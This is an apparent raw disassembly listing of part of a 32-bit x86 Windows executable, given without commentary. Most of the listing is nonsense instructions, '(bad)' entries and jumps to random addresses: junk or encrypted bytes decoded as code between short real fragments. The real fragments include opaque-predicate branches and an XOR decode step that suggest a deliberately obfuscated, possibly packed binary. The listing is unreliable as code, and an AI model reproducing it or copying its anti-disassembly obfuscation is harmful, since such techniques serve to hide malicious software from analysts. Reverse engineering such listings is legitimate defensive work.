  4059ce:	mov    dh,0xe7
  4059d0:	das    
  4059d1:	mov    al,ds:0xa87b31b6
  4059d6:	mov    edi,0x4fd3c845
  4059dc:	jmp    0x4059c9
  4059de:	mov    eax,0xffffdedc
  4059e3:	mov    DWORD PTR [ebp-0x34],eax
  4059e6:	cmp    DWORD PTR ds:0x42f628,0x0
  4059ed:	jbe    0x405a01
  4059f3:	jmp    0x405a01
  4059f8:	push   DWORD PTR [ebp-0x14]
  4059fb:	call   DWORD PTR ds:0x4387c8
  405a01:	mov    DWORD PTR [ebp-0x28],0xebeb4fd4
  405a08:	mov    DWORD PTR [ebp-0x24],eax
  405a0b:	mov    DWORD PTR [ebp-0x20],0xebeb4fd5
  405a12:	mov    DWORD PTR [ebp-0x1c],eax
  405a15:	jmp    0x405aed
  405a1a:	push   esi
  405a1b:	or     eax,DWORD PTR [ebx-0x65]
  405a1e:	pop    edi
  405a1f:	fcmovnu st,st(6)
  405a21:	iret   
  405a22:	jg     0x405a4c
  405a24:	pop    ecx
  405a25:	fisub  WORD PTR [edx+0x42]
  405a28:	mov    eax,0x2b19e4
  405a2d:	add    BYTE PTR [ebx-0x3d000000],bh
  405a33:	das    
  405a34:	mov    WORD PTR [edx-0x68],cs
  405a37:	(bad)  
  405a38:	dec    esi
  405a39:	cwde   
  405a3a:	sahf   
  405a3b:	xor    BYTE PTR [ebp-0xdcb96fb],dl
  405a41:	stc    
  405a42:	leave  
  405a43:	clc    
  405a44:	pusha  
  405a45:	fnstsw WORD PTR ss:[ecx+ebx*2+0x348b5412]
  405a4d:	sub    eax,0xef72004f
  405a52:	test   BYTE PTR [esi+0x14],0x6f
  405a56:	ss es (bad) 
  405a59:	(bad)  
  405a5a:	cmp    al,0x3a
  405a5c:	fcmovnb st,st(0)
  405a5e:	xor    edi,edi
  405a60:	mov    ch,0xd1
  405a62:	mov    WORD PTR [ebp+0x1],cs
  405a65:	(bad)  
  405a66:	ror    DWORD PTR [esi+0x12],cl
  405a69:	xlat   BYTE PTR ds:[ebx]
  405a6a:	sti    
  405a6b:	inc    eax
  405a6c:	sbb    BYTE PTR [edi+0x3acf10fb],cl
  405a72:	bswap  edx
  405a74:	push   es
  405a75:	add    BYTE PTR [ebx+ebp*4+0x25],dh
  405a79:	sar    DWORD PTR [edx-0x58],cl
  405a7c:	xchg   ecx,eax
  405a7d:	dec    edi
  405a7e:	ja     0x405a58
  405a80:	cmp    al,BYTE PTR [edi-0x3c]
  405a83:	cmp    ebx,DWORD PTR [ecx-0x26dc426d]
  405a89:	clc    
  405a8a:	mov    bl,0x1e
  405a8c:	pop    ds
  405a8d:	outs   dx,BYTE PTR ds:[esi]
  405a8e:	aas    
  405a8f:	(bad)  
  405a91:	cmp    eax,0x9a9cb3a7
  405a96:	test   al,0xa9
  405a98:	out    0xf1,al
  405a9a:	ret    0x4f30
  405a9d:	inc    esi
  405a9e:	jbe    0x405b16
  405aa0:	push   ecx
  405aa1:	pop    edx
  405aa2:	mov    eax,0x2c27a3fd
  405aa7:	call   0x454d:0xc947f673
  405aae:	fisubr DWORD PTR [edi+0x2b]
  405ab1:	add    ch,al
  405ab3:	adc    al,0x38
  405ab5:	push   edi
  405ab6:	cld    
  405ab7:	jle    0x405ae3
  405ab9:	cmp    bh,ch
  405abb:	mov    esp,0x7a5b073b
  405ac0:	call   0xb4ee:0xb88e06f0
  405ac7:	test   eax,0x268e6647
  405acc:	sub    BYTE PTR [ebx+ebx*1-0x27],ch
  405ad0:	mov    DWORD PTR [eax+ecx*2],0xcd97245e
  405ad7:	push   ss
  405ad8:	or     al,0x2a
  405ada:	outs   dx,DWORD PTR ds:[esi]
  405adb:	cmp    DWORD PTR [bx+si-0x1f],ecx
  405adf:	and    al,0x3d
  405ae1:	cmc    
  405ae2:	enter  0x891e,0x40
  405ae6:	in     eax,0x3
  405ae8:	ins    BYTE PTR es:[edi],dx
  405ae9:	daa    
  405aea:	in     eax,dx
  405aeb:	test   DWORD PTR [edx-0x2917ba39],edi
  405af1:	dec    edi
  405af2:	jmp    0x405adf
  405af4:	mov    DWORD PTR [ebp-0x14],eax
  405af7:	mov    eax,DWORD PTR [ebp-0x38]
  405afa:	dec    DWORD PTR ds:0x42f5ac
  405b00:	mov    edx,DWORD PTR [ebp-0x34]
  405b03:	cmp    DWORD PTR ds:0x42f658,0x0
  405b0a:	jle    0x405b1b
  405b10:	jmp    0x405b1b
  405b15:	call   DWORD PTR ds:0x4387d0
  405b1b:	xor    eax,esi
  405b1d:	lea    eax,[ebp+eax*1-0x66479db7]
  405b24:	mov    DWORD PTR [ebp+0x10],eax
  405b27:	mov    eax,DWORD PTR [ebp-0x38]
  405b2a:	mov    edx,DWORD PTR [ebp-0x34]
  405b2d:	mov    edx,DWORD PTR [ebp-0x8]
  405b30:	xor    eax,esi
  405b32:	adc    DWORD PTR ds:0x42f5fc,0x696
  405b3c:	mov    dl,BYTE PTR [eax+edx*1-0x66479db3]
  405b43:	mov    eax,ds:0x42f5f0
  405b48:	adc    DWORD PTR ds:0x42f5ac,eax
  405b4e:	jmp    0x405c26
  405b53:	call   0xfeb70bfe
  405b58:	jbe    0x405b48
  405b5a:	mov    esi,0x7091e41d
  405b5f:	pop    eax
  405b60:	add    eax,0x2bd4bce2
  405b65:	add    BYTE PTR [eax],al
  405b67:	mov    ebx,0x3e000000
  405b6c:	das    
  405b6d:	rcr    BYTE PTR [esi+0x12354ec2],0xb
  405b74:	pop    edx
  405b75:	cli    
  405b76:	fisttp WORD PTR [ebx]
  405b78:	maxps  xmm0,xmm1
  405b7b:	dec    esi
  405b7c:	dec    ebp
  405b7d:	add    DWORD PTR [ebx],esi
  405b7f:	mov    ebx,0x2dda4827
  405b84:	add    ebx,DWORD PTR [ebp*4-0x441d99b1]
  405b8b:	add    eax,0x34be8fdd
  405b90:	sub    ch,dh
  405b92:	push   ebp
  405b93:	ins    BYTE PTR es:[edi],dx
  405b94:	mov    ?,WORD PTR [esi+0x1c8b9c0e]
  405b9a:	push   ecx
  405b9b:	popf   
  405b9c:	push   ecx
  405b9d:	mov    ah,0x49
  405b9f:	jo     0x405b75
  405ba1:	data16 mov cs,WORD PTR [edi+0x7a]
  405ba5:	lods   al,BYTE PTR ds:[esi]
  405ba6:	hlt    
  405ba7:	daa    
  405ba8:	jbe    0x405b6b
  405baa:	test   DWORD PTR [ebp-0x6a82852b],ecx
  405bb0:	int    0xc6
  405bb2:	fwait
  405bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bb4:	push   esp
  405bb5:	leave  
  405bb6:	test   eax,0x3eb4b504
  405bbb:	add    DWORD PTR [edx-0x29],ecx
  405bbe:	xchg   edi,eax
  405bbf:	mov    DWORD PTR [ecx],0x5c00f82c
  405bc5:	out    0xfa,al
  405bc7:	mov    dh,0xf6
  405bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bca:	jmp    0x4674:0xaeac46e9
  405bd1:	ins    BYTE PTR es:[edi],dx
  405bd2:	in     eax,dx
  405bd3:	dec    edx
  405bd4:	fidivr DWORD PTR [ebx+0x38]
  405bd7:	push   edx
  405bd8:	das    
  405bd9:	xchg   ebx,eax
  405bda:	aad    0x4e
  405bdc:	cmc    
  405bdd:	mov    ds:0xe0961eb5,al
  405be2:	icebp  
  405be3:	cmp    ecx,DWORD PTR [esi]
  405be5:	jmp    0x276cf0eb
  405bea:	jmp    0x405c34
  405bec:	aas    
  405bed:	jmp    0x2badfda3
  405bf2:	rol    DWORD PTR [ebp+0x48d76aaf],1
  405bf8:	fcomp  DWORD PTR [eax]
  405bfa:	cmp    dl,bl
  405bfc:	loope  0x405c1b
  405bfe:	fimul  WORD PTR [esi-0x77a3d81a]
  405c04:	inc    esi
  405c05:	(bad)  
  405c06:	jo     0x405c55
  405c08:	cs mov bh,0xc0
  405c0b:	repz mov esp,0x51b4623f
  405c11:	arpl   WORD PTR [ebp-0x20],bp
  405c14:	sbb    eax,0xb9ed0cb7
  405c19:	cli    
  405c1a:	lods   al,BYTE PTR ds:[esi]
  405c1b:	repnz fsubrp st(2),st
  405c1e:	pop    es
  405c1f:	push   es
  405c20:	nop
  405c21:	push   esi
  405c22:	imul   esp,DWORD PTR ds:0x458b8a8f,0x10
  405c29:	add    DWORD PTR ds:0x42f5c8,0x5438
  405c33:	jmp    0x405d0b
  405c38:	lods   eax,DWORD PTR ds:[esi]
  405c39:	mov    ah,0x52
  405c3b:	mov    ebx,0xb6edff5b
  405c40:	ds hlt 
  405c42:	bound  ecx,QWORD PTR [esi+0x7]
  405c45:	push   eax
  405c46:	mov    al,ds:0x2c8f0d
  405c4b:	add    BYTE PTR [ebx-0x28000000],bh
  405c51:	inc    esi
  405c52:	call   0x2e00bd5b
  405c57:	sbb    esp,DWORD PTR [edi-0x7274d41e]
  405c5d:	js     0x405c1d
  405c5f:	stos   BYTE PTR es:[edi],al
  405c60:	sbb    al,0xd8
  405c62:	add    ecx,DWORD PTR [edx+0x49]
  405c65:	out    0x50,al
  405c67:	pop    eax
  405c68:	daa    
  405c69:	retf   
  405c6a:	xchg   edx,eax
  405c6b:	mov    ch,0x83
  405c6d:	add    bh,dl
  405c6f:	xchg   esp,eax
  405c70:	xlat   BYTE PTR es:[ebx]
  405c72:	pop    ebp
  405c73:	(bad)  
  405c74:	rol    BYTE PTR [edi+0x2f8fb555],0x9e
  405c7b:	pop    edx
  405c7c:	pop    es
  405c7d:	test   al,0xc
  405c7f:	lock pop esp
  405c81:	sub    eax,0xf8099508
  405c86:	lahf   
  405c87:	(bad)  
  405c88:	data16 je 0x405caf
  405c8b:	mov    ebx,0x86fe46bf
  405c90:	je     0x405cb0
  405c92:	push   ecx
  405c93:	out    dx,eax
  405c94:	or     esp,edi
  405c96:	xlat   BYTE PTR ds:[ebx]
  405c97:	pop    ebx
  405c98:	and    eax,0x71234e15
  405c9d:	jae    0x405ce4
  405c9f:	fs adc esi,ebx
  405ca2:	sti    
  405ca3:	pop    esi
  405ca4:	pop    ebx
  405ca5:	add    esp,DWORD PTR [di-0xbc4]
  405caa:	fwait
  405cab:	ret    0xdc2c
  405cae:	dec    esp
  405caf:	push   edi
  405cb0:	mov    ch,0xf7
  405cb2:	bound  esi,QWORD PTR [edi+0xd]
  405cb5:	cdq    
  405cb6:	jnp    0x405ce5
  405cb8:	in     eax,dx
  405cb9:	daa    
  405cba:	cmp    BYTE PTR [esi+0xa0f29c1],ch
  405cc0:	imul   edx,DWORD PTR [edx+0x75],0x44
  405cc4:	jp     0x405c50
  405cc6:	sub    edi,DWORD PTR [ebp+edi*1+0x15f00e6d]
  405ccd:	mov    ebx,0xe31e671a
  405cd2:	(bad)  
  405cd3:	shl    BYTE PTR [edi+0x342e9217],cl
  405cd9:	in     eax,dx
  405cda:	cmp    esi,DWORD PTR [eax-0x7ee7973e]
  405ce0:	addr16 cld 
  405ce2:	or     eax,0xdc863f87
  405ce7:	mov    eax,0x35a3aa24
  405cec:	loop   0x405ca5
  405cee:	push   esp
  405cef:	shr    BYTE PTR [eax],0xca
  405cf2:	add    al,0x93
  405cf4:	add    BYTE PTR [ebp-0x656f802c],bh
  405cfa:	mov    dl,0x90
  405cfc:	or     al,0x21
  405cfe:	add    al,0xe2
  405d00:	mov    DWORD PTR [esi+esi*1-0x4f],esp
  405d04:	test   ebp,edi
  405d06:	ins    BYTE PTR es:[edi],dx
  405d07:	mov    ebp,0x30bd5dd7
  405d0c:	adc    BYTE PTR [ebx+0x42f5483d],al
  405d12:	add    BYTE PTR [eax],al
  405d14:	jge    0x405e12
  405d1a:	jmp    0x405e12
  405d1f:	push   DWORD PTR [ebp-0x20]
  405d22:	push   0x7457
  405d27:	push   DWORD PTR [ebp-0x14]
  405d2a:	push   0x1f8a
  405d2f:	push   0x3348
  405d34:	call   DWORD PTR ds:0x4387d4
  405d3a:	jmp    0x405e12
  405d3f:	dec    eax
  405d40:	or     edi,edi
  405d42:	arpl   di,di
  405d44:	neg    esp
  405d46:	sub    ebx,DWORD PTR [ecx]
  405d48:	sub    ch,0x74
  405d4b:	sub    BYTE PTR [edx+ebx*1],al
  405d4e:	lahf   
  405d4f:	dec    edx
  405d50:	sub    eax,0xbb0000
  405d55:	add    BYTE PTR [eax],al
  405d57:	bound  esp,QWORD PTR [edi+0x5637ca11]
  405d5d:	dec    edi
  405d5e:	xchg   ecx,eax
  405d5f:	sub    BYTE PTR [ecx],ch
  405d61:	sbb    eax,DWORD PTR [eax]
  405d63:	es aaa 
  405d65:	loop   0x405de3
  405d67:	and    DWORD PTR [ebx+0x1f9da54c],ebp
  405d6d:	and    al,0x99
  405d6f:	jge    0x405d95
  405d71:	fs mov bl,0x38
  405d74:	adc    dl,BYTE PTR [edx+edx*4]
  405d77:	pop    eax
  405d78:	fist   WORD PTR [ebp+0x111460a1]
  405d7e:	lods   al,BYTE PTR ds:[esi]
  405d7f:	ds (bad) 
  405d81:	fcomp  QWORD PTR [ecx+0x61]
  405d84:	ds aas 
  405d86:	mov    al,0xc5
  405d88:	es inc edi
  405d8a:	hlt    
  405d8b:	aas    
  405d8c:	shl    BYTE PTR [ebx],1
  405d8e:	aas    
  405d8f:	lods   eax,DWORD PTR ds:[esi]
  405d90:	inc    ebp
  405d91:	jg     0x405d61
  405d93:	jl     0x405de1
  405d95:	inc    edi
  405d96:	(bad)  
  405d97:	xchg   ecx,eax
  405d98:	test   eax,0x65531ac5
  405d9d:	sub    BYTE PTR [ebx+esi*8-0x68c6efd9],0x48
  405da5:	sub    ecx,DWORD PTR [edi]
  405da7:	(bad)  
  405da8:	das    
  405da9:	adc    eax,0x8efad80
  405dae:	pusha  
  405daf:	rol    ch,0xaf
  405db2:	inc    ebx
  405db3:	iret   
  405db4:	icebp  
  405db5:	or     al,0xa6
  405db7:	leave  
  405db8:	in     eax,dx
  405db9:	retf   
  405dba:	and    ecx,esi
  405dbc:	mov    edx,esp
  405dbe:	mov    edi,0xdaf516b6
  405dc3:	or     al,0x3f
  405dc5:	daa    
  405dc6:	xchg   esi,eax
  405dc7:	js     0x405da1
  405dc9:	(bad)  
  405dca:	(bad)  
  405dcb:	test   eax,0x4eba629
  405dd0:	inc    edi
  405dd1:	fisub  WORD PTR [edx-0x24]
  405dd4:	fcomp  QWORD PTR [edi-0x37]
  405dd7:	lods   al,BYTE PTR ds:[esi]
  405dd8:	sbb    DWORD PTR [edx+eax*4+0x51],ebx
  405ddc:	mov    edx,0x1d4f9175
  405de1:	in     eax,dx
  405de2:	inc    ebx
  405de3:	inc    esp
  405de4:	or     BYTE PTR [ebp+edi*2-0x172fd17e],al
  405deb:	cmp    DWORD PTR [esi+0x49],ebx
  405dee:	inc    ebx
  405def:	popa   
  405df0:	fsub   st,st(1)
  405df2:	stos   BYTE PTR es:[edi],al
  405df3:	fadd   DWORD PTR [esi-0x43bb2b63]
  405df9:	push   ds
  405dfa:	and    al,0xc4
  405dfc:	fadd   DWORD PTR [edi-0x1b]
  405dff:	inc    ebx
  405e00:	or     BYTE PTR [esi-0x1f],bl
  405e03:	sub    esp,DWORD PTR [ebx+0x688519a3]
  405e09:	cwde   
  405e0a:	cwde   
  405e0b:	push   ss
  405e0c:	jae    0x405da3
  405e0e:	xlat   BYTE PTR ds:[ebx]
  405e0f:	div    ch
  405e11:	push   ebp
  405e12:	mov    eax,DWORD PTR [ebp-0x28]
  405e15:	mov    edx,DWORD PTR [ebp-0x24]
  405e18:	xor    eax,esi
  405e1a:	lea    eax,[ebp+eax*1-0x66479db7]
  405e21:	jmp    0x405ef9
  405e26:	inc    ebp
  405e27:	add    dh,BYTE PTR [ebx+0x16]
  405e2a:	ja     0x405ea3
  405e2c:	gs push ebx
  405e2e:	add    esi,DWORD PTR [ecx]
  405e30:	mov    edx,0xe8cb73e4
  405e35:	addr16 add eax,0xbb00002e
  405e3b:	add    BYTE PTR [eax],al
  405e3d:	add    BYTE PTR [edi+0x17],ah
  405e40:	stos   DWORD PTR es:[edi],eax
  405e41:	icebp  
  405e42:	(bad)  
  405e43:	rol    DWORD PTR [eax],1
  405e45:	mov    esp,0x4cc2d85f
  405e4a:	std    
  405e4b:	outs   dx,DWORD PTR ds:[esi]
  405e4c:	mov    ds:0x92d09c86,al
  405e51:	push   esi
  405e52:	and    al,0xdf
  405e54:	xchg   ebx,eax
  405e55:	in     al,0x4f
  405e57:	or     bh,al
  405e59:	pop    esi
  405e5a:	xchg   edi,eax
  405e5b:	adc    al,0xb2
  405e5d:	pop    ss
  405e5e:	mov    bl,0xbd
  405e60:	ins    DWORD PTR es:[edi],dx
  405e61:	(bad)  
  405e62:	pop    esi
  405e63:	pop    eax
  405e64:	fld    TBYTE PTR [edx+0x23ab74fa]
  405e6a:	cwde   
  405e6b:	xchg   ebx,eax
  405e6c:	aam    0xad
  405e6e:	data16 cmp ch,dl
  405e71:	aam    0xd8
  405e73:	std    
  405e74:	fld    st(2)
  405e76:	adc    ebp,edx
  405e78:	pop    eax
  405e79:	jl     0x405ed7
  405e7b:	add    al,0x22
  405e7d:	ja     0x405e75
  405e7f:	shl    BYTE PTR [edi],0x52
  405e82:	ds fs mov edx,0xd242be19
  405e89:	push   0x70
  405e8b:	setge  BYTE PTR [ebx-0x9]
  405e8f:	aad    0x80
  405e91:	loope  0x405ee9
  405e93:	jge    0x405f03
  405e95:	dec    BYTE PTR [ebx+0x4e4d109b]
  405e9b:	jl     0x405e73
  405e9d:	arpl   WORD PTR [ecx],bp
  405e9f:	(bad)  
  405ea0:	push   ss
  405ea1:	inc    edx
  405ea2:	xchg   BYTE PTR [ebp-0x7908eb3b],cl
  405ea8:	cmp    ah,BYTE PTR [ebp-0x5d]
  405eab:	leave  
  405eac:	cmc    
  405ead:	clc    
  405eae:	fld    QWORD PTR [edi+eax*8-0x2cd5b8a0]
  405eb5:	jno    0x405e80
  405eb7:	out    dx,al
  405eb8:	iret   
  405eb9:	inc    edi
  405eba:	test   al,bl
  405ebc:	fiadd  WORD PTR [eax+0x16]
  405ebf:	dec    ebp
  405ec0:	(bad)  
  405ec1:	push   edi
  405ec2:	jmp    0x8bcc3837
  405ec7:	xchg   BYTE PTR [esi+0x468f9a0d],al
  405ecd:	je     0x405e8e
  405ecf:	imul   ecx,DWORD PTR gs:[ecx],0x3d442a3c
  405ed6:	sbb    al,0xc7
  405ed8:	jle    0x405f07
  405eda:	stos   DWORD PTR es:[edi],eax
  405edb:	fbstp  TBYTE PTR [edx]
  405edd:	and    ecx,DWORD PTR [ebp-0x64b4721d]
  405ee3:	xor    BYTE PTR [edi-0x69],bl
  405ee6:	add    ecx,eax
  405ee8:	popf   
  405ee9:	sub    esp,0x78706310
  405eef:	lock fidivr WORD PTR [edx]
  405ef2:	xchg   BYTE PTR [ebx],ah
  405ef4:	imul   ebp,DWORD PTR [edi+0x20],0x458967c9
  405efb:	adc    cl,ch
  405efd:	rol    DWORD PTR [eax],cl
  405eff:	add    BYTE PTR [eax],al
  405f01:	jno    0x405f23
  405f03:	wbinvd 
  405f05:	pop    edi
  405f06:	das    
  405f07:	ja     0x405f81
  405f09:	repnz out dx,eax
  405f0b:	sbb    DWORD PTR [edi-0x6f],0xc01c4c28
  405f12:	add    BYTE PTR cs:[eax],al
  405f15:	mov    ebx,0xdc000000
  405f1a:	cmp    edx,DWORD PTR [ebx+0x74351d2d]
  405f20:	mov    ch,BYTE PTR [ebx+0x42]
  405f23:	pop    es
  405f24:	jmp    FWORD PTR [ebx]
  405f26:	xor    BYTE PTR [esi-0x7ba94ede],cl
  405f2c:	cdq    
  405f2d:	ds loop 0x405f7d
  405f30:	rcr    BYTE PTR [edx+0x3f],cl
  405f33:	rcl    DWORD PTR [ebx+0x2ae17ec],cl
  405f39:	pop    edi
  405f3a:	rol    BYTE PTR [ecx+ebx*8+0x4a],0xaf
  405f3f:	sti    
  405f40:	add    eax,0xc214e1a2
  405f45:	jno    0x405f4c
  405f47:	popf   
  405f48:	and    DWORD PTR [ebp+0x3eacac8b],esi
  405f4e:	or     DWORD PTR [esi-0x74],ebp
  405f51:	cmp    al,0x94
  405f53:	and    edx,ebp
  405f55:	add    BYTE PTR [edi],bh
  405f57:	mov    bl,0x93
  405f59:	neg    BYTE PTR [ecx+0x79]
  405f5c:	xchg   edx,eax
  405f5d:	cmp    dh,BYTE PTR [edx-0x40]
  405f60:	mov    esp,0xd971d782
  405f65:	pop    ecx
  405f66:	clc    
  405f67:	mov    eax,0xf472edae
  405f6c:	mov    bl,0xc3
  405f6e:	je     0x405f3a
  405f70:	int    0x8c
  405f72:	xor    eax,0xfd7c34ba
  405f77:	sub    cl,BYTE PTR [eax+0x521b1f97]
  405f7d:	mov    BYTE PTR [esi+0x2bfefecd],al
  405f83:	and    ebx,DWORD PTR [ebx+0x5]
  405f86:	ss dec esi
  405f88:	adc    eax,0x312231b4
  405f8d:	shr    DWORD PTR [ecx-0x101cd76c],0xb3
  405f94:	daa    
  405f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f96:	fwait
  405f97:	test   al,0x36
  405f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f9a:	jl     0x960296b2
  405fa0:	cli    
  405fa1:	push   0xffffffcf
  405fa3:	jmp    0xc0679564
  405fa8:	pusha  
  405fa9:	mov    ebx,0x8db63fc0
  405fae:	inc    ebx
  405faf:	add    DWORD PTR [edi+0x79],eax
  405fb2:	xchg   BYTE PTR gs:[ecx],dl
  405fb5:	data16 outs dx,BYTE PTR ds:[esi]
  405fb7:	fwait
  405fb8:	ja     0x405fa0
  405fba:	fisubr DWORD PTR [ebx-0x50]
  405fbd:	test   ch,dl
  405fbf:	adc    ch,BYTE PTR [eax+0xe]
  405fc2:	dec    edx
  405fc3:	retf   0x2503
  405fc6:	nop
  405fc7:	call   0xb9c3:0x89131e25
  405fce:	dec    esp
  405fcf:	mov    WORD PTR [edx],es
  405fd1:	clc    
  405fd2:	jae    0x405fe0
  405fd4:	mov    eax,DWORD PTR [ebp-0x28]
  405fd7:	jmp    0x4060af
  405fdc:	imul   ebx,DWORD PTR [eax+0x73],0x1b
  405fe0:	jae    0x40601d
  405fe2:	imul   edi,DWORD PTR [eax+0x67],0xffffffc0
  405fe6:	fdiv   DWORD PTR [ebx]
  405fe8:	mov    ebp,0x7b4ec3bc
  405fed:	das    
  405fee:	add    BYTE PTR [eax],al
  405ff0:	mov    ebx,0xd5000000
  405ff5:	pop    ebx
  405ff6:	jns    0x405fa1
  405ff8:	dec    edx
  405ff9:	sub    eax,edi
  405ffb:	mov    cl,0x9b
  405ffd:	test   edi,edx
  405fff:	mov    ch,0xa2
  406001:	fidivr WORD PTR [eax]
  406003:	lods   al,BYTE PTR ds:[esi]
  406004:	mov    ds:0x23a397c,al
  406009:	sbb    eax,0x26cf9b3c
  40600e:	add    eax,esi
  406010:	into   
  406011:	loopne 0x406087
  406013:	or     ch,BYTE PTR [ebp+0x2c]
  406016:	add    esp,DWORD PTR [ecx]
  406018:	test   DWORD PTR ds:[eax+0x1a],esi
  40601c:	stos   DWORD PTR es:[edi],eax
  40601d:	mul    DWORD PTR [esi+0x29]
  406020:	mov    cl,0x32
  406022:	dec    edx
  406023:	sahf   
  406024:	mov    DWORD PTR [ebp+0x2e],0xc3f654fb
  40602b:	cwde   
  40602c:	mov    eax,0x77e27ae8
  406031:	or     DWORD PTR [ebx],ecx
  406033:	icebp  
  406034:	fstp   DWORD PTR [eax+ebp*4+0x365a6a8b]
  40603b:	or     BYTE PTR [edi-0x17],cl
  40603e:	(bad)  
  40603f:	pop    ss
  406040:	retf   
  406041:	out    0x43,eax
  406043:	mov    dh,0x5e
  406045:	mov    ch,0xce
  406047:	jg     0x4060a3
  406049:	ffreep st(4)
  40604b:	dec    esi
  40604c:	pop    ds
  40604d:	xchg   edi,eax
  40604e:	rol    BYTE PTR [ebx],1
  406050:	and    edi,DWORD PTR [esi-0x3055b5ef]
  406056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406057:	jbe    0x405fd9
  406059:	mov    cl,0xd1
  40605b:	or     dh,BYTE PTR [esp+0x418a4baa]
  406062:	cmp    ebx,edx
  406064:	pop    ecx
  406065:	je     0x406039
  406067:	loope  0x4060ab
  406069:	fdivr  QWORD PTR [edi+0x5055673d]
  40606f:	xchg   BYTE PTR [ecx-0x1cc17e51],bl
  406075:	(bad)  
  406076:	jne    0x406005
  406078:	cmp    al,0x4c
  40607a:	jae    0x4060f2
  40607c:	loop   0x4060dc
  40607e:	leave  
  40607f:	xchg   edi,eax
  406080:	rcr    edi,1
  406082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406083:	and    eax,0x5366a74b
  406088:	into   
  406089:	xchg   ecx,eax
  40608a:	jno    0x406038
  40608c:	fcom   QWORD PTR [ebx+0x2273bb60]
  406092:	cld    
  406093:	or     BYTE PTR [ebx],dh
  406095:	dec    esi
  406096:	inc    eax
  406097:	adc    BYTE PTR [eax+0x53],ah
  40609a:	xor    dl,BYTE PTR [eax-0x4]
  40609d:	add    DWORD PTR [edx+edi*1],0x4f3bcfcb
  4060a4:	inc    ebp
  4060a5:	or     eax,0xb2c72eee
  4060aa:	lods   eax,DWORD PTR ds:[esi]
  4060ab:	mov    esi,0x8b6c2f6b
  4060b0:	push   ebp
  4060b1:	fmul   QWORD PTR [ebx+0x581f855]
  4060b7:	sbb    al,0xf6
  4060b9:	inc    edx
  4060ba:	add    al,bh
  4060bc:	cmc    
  4060bd:	inc    edx
  4060be:	add    cl,ch
  4060c0:	rol    DWORD PTR [eax],cl
  4060c2:	add    BYTE PTR [eax],al
  4060c4:	sbb    DWORD PTR [ecx-0x1202760b],edx
  4060ca:	jge    0x40605d
  4060cc:	(bad)
  4060cf:	xor    ebx,DWORD PTR [esi+0x36954a46]
  4060d5:	xor    BYTE PTR [eax],al
  4060d7:	add    BYTE PTR [ebx+0x7e000000],bh
  4060dd:	dec    esi
  4060de:	out    dx,al
  4060df:	or     DWORD PTR [eax+ecx*1+0x5eefb9f1],edi
  4060e6:	jle    0x4060df
  4060e8:	(bad)  
  4060e9:	ds mov edi,0xbba9ee66
  4060ef:	or     BYTE PTR [eax+0x3927aa8a],cl
  4060f5:	std    
  4060f6:	inc    esi
  4060f7:	mov    eax,0x584f652e
  4060fc:	pop    ss
  4060fd:	jne    0x40616b
  4060ff:	repz out 0x54,al
  406102:	scas   eax,DWORD PTR es:[edi]
  406103:	mov    BYTE PTR [bx+0x37],dl
  406107:	aaa    
  406108:	std    
  406109:	jb     0x406145
  40610b:	adc    esi,0xffffffc4
  40610e:	sbb    eax,0x498bde32
  406113:	jge    0x406189
  406115:	mov    ch,0xe7
  406117:	cdq    
  406118:	jge    0x4060f2
  40611a:	lds    edi,FWORD PTR [ebp+0x1a]
  40611d:	sbb    bl,BYTE PTR [eax]
  40611f:	inc    esp
  406120:	inc    eax
  406121:	popa   
  406122:	popf   
  406123:	mov    dh,0x6e
  406125:	mov    eax,ds:0xfdeb3841
  40612a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40612b:	jae    0x40616f
  40612d:	(bad)  
  40612e:	jmp    0x823d6582
  406133:	push   0x245100bc
  406138:	js     0x4060c0
  40613a:	or     edx,DWORD PTR [ecx-0x6f6a7be9]
  406140:	js     0x4060f4
  406142:	xchg   esi,eax
  406143:	cmp    dh,BYTE PTR [edi]
  406145:	sbb    esi,DWORD PTR [ebx-0xc]
  406148:	jae    0x40616a
  40614a:	and    ebx,DWORD PTR [edi]
  40614c:	popa   
  40614d:	aaa    
  40614e:	popa   
  40614f:	or     DWORD PTR [ecx+0x47],0x3b
  406153:	dec    esp
  406154:	sbb    al,al
  406156:	imul   ebp,edx,0xd1435bd3
  40615c:	sbb    ecx,edx
  40615e:	xor    eax,0x76d06dad
  406163:	sbb    DWORD PTR [eax],edx
  406165:	ret    0x632d
  406168:	add    DWORD PTR [ebp+0x1a055c],0x16
  40616f:	and    al,BYTE PTR [esi+0x1b]
  406172:	or     eax,0xadc9d05d
  406177:	pusha  
  406178:	ins    BYTE PTR es:[edi],dx
  406179:	ror    al,cl
  40617b:	daa    
  40617c:	ds sbb eax,0xfb4bc862
  406182:	or     eax,0xc27ad572
  406187:	xchg   edx,eax
  406188:	imul   ch
  40618a:	outs   dx,BYTE PTR ds:[esi]
  40618b:	xor    dl,ch
  40618d:	push   esp
  40618e:	inc    ebx
  40618f:	je     0x406167
  406191:	(bad)  
  406193:	(bad)  
  406194:	sbb    ah,BYTE PTR [ebp+edx*8+0x33]
  406198:	(bad)  
  406199:	mov    dl,BYTE PTR [eax+edx*1-0x66479db3]
  4061a0:	mov    eax,DWORD PTR [ebp+0x10]
  4061a3:	mov    DWORD PTR ds:0x42f5e4,0xb68
  4061ad:	xor    BYTE PTR [eax],dl
  4061af:	mov    eax,ds:0x42f56c
  4061b4:	or     DWORD PTR ds:0x42f554,eax
  4061ba:	jmp    0x406292
  4061bf:	stos   BYTE PTR es:[edi],al
  4061c0:	ficomp DWORD PTR [eax-0x1129072c]
  4061c6:	(bad)  
  4061c7:	in     al,0xfd
  4061c9:	aad    0xbf
  4061cb:	pop    esp
  4061cc:	or     BYTE PTR [esi-0x6b],ch
  4061cf:	icebp  
  4061d0:	xor    BYTE PTR [eax],al
  4061d2:	add    BYTE PTR [ebx-0x13000000],bh
  4061d8:	pop    es
  4061d9:	(bad)  
  4061da:	test   BYTE PTR [ecx-0x6822d995],0x3f
  4061e1:	sub    BYTE PTR [ebx],0xa1
  4061e4:	(bad)  
  4061e5:	fwait
  4061e6:	ss jae 0x406192
  4061e9:	mov    al,0x49
  4061eb:	jmp    0xb791bd2f
  4061f0:	lea    ebx,[edx-0x38]
  4061f3:	pop    ebx
  4061f4:	out    0x89,eax
